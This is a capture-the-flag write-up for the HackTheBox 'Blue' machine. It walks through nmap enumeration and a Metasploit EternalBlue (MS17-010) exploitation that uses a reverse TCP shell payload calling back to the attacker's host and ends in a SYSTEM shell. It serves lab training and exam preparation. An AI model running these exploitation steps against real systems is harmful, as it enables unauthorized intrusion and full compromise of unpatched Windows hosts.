# Blue - HackTheBox - Easy

## Summary
The machine runs Windows 7 SP1 with SMB exposed, vulnerable to EternalBlue (CVE-2017-0143 / MS17-010) — the NSA exploit leaked by  Shadow Brokers in 2017. Exploitation yields a direct SYSTEM shell with no privesc needed.


## Tools
- nmap
- metasploit

## 1. Enumeration
### Port Scanning
```bash
nmap -p- -sC -sV -sS -vvv -n -Pn --min-rate 5000 10.10.10.40 -oN escaneo
```

We see there are some opened ports:
```
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
```

Windows 7 SP1 with SMB exposed is a strong indicator of EternalBlue. When an outdated Windows version is found, MS17-010 should always be the first thing to check.

```sh
nmap --script vuln -p445 10.10.10.40

VULNERABLE
CVE-2017-0143
```

## 2. Exploitation
```sh
msfconsole
search CVE-2017-0143
use 0
set RHOSTS 10.10.10.40
set LHOST 10.10.16.27

show payloads
set payload 59
run
```

`windows/x64/shell_reverse_tcp`

## 3. Post-Exploitation
No privesc needed — EternalBlue directly spawns a SYSTEM shell:

```cmd
whoami
> nt authority\system
```

## 4. Lessons Learned
- Outdated Windows versions (XP, 7, Server 2003/2008) → always check MS17-010
- `nmap --script vuln` confirms exploitability before attempting exploitation
- EternalBlue gives direct SYSTEM — one of the most impactful CVEs ever (WannaCry, NotPetya)
- SMBv1 should never be enabled in production environments
- MS17-010 is guaranteed to appear in the eJPT exam
